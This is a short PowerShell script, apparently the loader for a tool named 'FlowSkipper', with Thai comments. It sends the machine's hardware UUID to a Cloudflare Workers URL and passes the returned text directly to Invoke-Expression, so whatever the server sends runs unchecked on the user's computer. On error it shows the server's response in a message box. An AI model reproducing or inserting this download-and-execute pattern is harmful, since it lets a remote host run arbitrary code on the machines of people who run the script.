Add-Type -AssemblyName System.Windows.Forms

$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
$body = @{ hwid = $hwid } | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri "https://flat-art-959b.rov170652.workers.dev" -Method Post -Body $body -ContentType "application/json"
    
    # ถ้ารับสคริปต์มาได้ จะสั่งรันทันที
    Invoke-Expression $response
} catch {
    # ดึงรายละเอียด Error จริงๆ ออกมาแสดงเพื่อ Debug
    $stream = $_.Exception.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $errMessage = $reader.ReadToEnd()
    
    [System.Windows.Forms.MessageBox]::Show("Worker Error: $errMessage", "FlowSkipper Debug", 0, 16)
}
